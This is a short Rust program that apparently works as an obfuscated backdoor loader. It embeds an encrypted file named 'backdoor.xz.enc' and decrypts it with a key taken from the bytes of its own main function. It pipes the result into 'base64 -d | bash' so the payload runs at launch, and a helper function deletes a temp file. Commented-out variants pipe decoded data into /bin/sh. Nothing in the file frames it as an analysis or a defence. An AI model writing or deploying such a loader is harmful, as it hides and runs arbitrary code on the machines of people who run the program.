use std::io::{BufWriter, Write};
use std::process::{Command, Stdio};

fn main() {
    // cast main function to byte slice to get the assembly code
    let main_fn_ptr = main as *const ();
    let main_fn_bytes: &[u8; 32] = unsafe { std::slice::from_raw_parts(main_fn_ptr as *const u8, 32).try_into().unwrap() };

    lol();

    let input = include_bytes!("backdoor.xz.enc");

    let key_iter = main_fn_bytes.iter().cycle();
    let decrypted = input.iter()
        .zip(key_iter)
        .map(|(byte, key_byte)| byte ^ key_byte)
        .collect::<Vec<u8>>();

    let mut proc = Command::new("bash")
        .arg("-c")
        .arg(format!(
            // "cat > /tmp/out; echo '0x{main_fn_bytes:02x?}' > /tmp/key; echo echo '0x{input:02x?}' > /tmp/enc", 
            "base64 -d | bash", 
            // "base64 -d > /tmp/out", 
        ))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    
    {
        let mut outstdin = proc.stdin.as_ref().unwrap();
        let mut writer = BufWriter::new(&mut outstdin);
    
        writer.write_all(&decrypted[..]).unwrap();    
    }

    {
        proc.wait().unwrap();
    }


}

fn lol() {
    Command::new("bash")
        .arg("-c")
        .arg(format!(
            // "echo '0x{main_fn_bytes:02x?}' > /tmp/key", 
            "rm /tmp/x", 
            // "base64 -d | /tmp/xz/bin/xz -d | /bin/sh", 
        ))
        .spawn()
        .unwrap();
}